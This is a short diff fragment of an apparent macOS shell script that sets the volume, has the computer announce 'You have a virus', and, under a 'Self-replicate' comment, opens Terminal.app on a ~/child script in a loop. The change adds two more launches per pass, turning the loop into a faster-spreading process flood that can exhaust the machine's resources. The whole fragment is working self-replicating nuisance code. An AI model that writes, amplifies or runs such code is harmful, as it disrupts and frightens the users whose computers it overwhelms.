@@ -14,4 +14,8 @@ osascript -e "set volume 7"
 say You have a virus
 #Self-replicate.
 open -a Terminal.app ~/child
+sleep .5
+open -a Terminal.app ~/child
+sleep .5
+open -a Terminal.app ~/child
 done
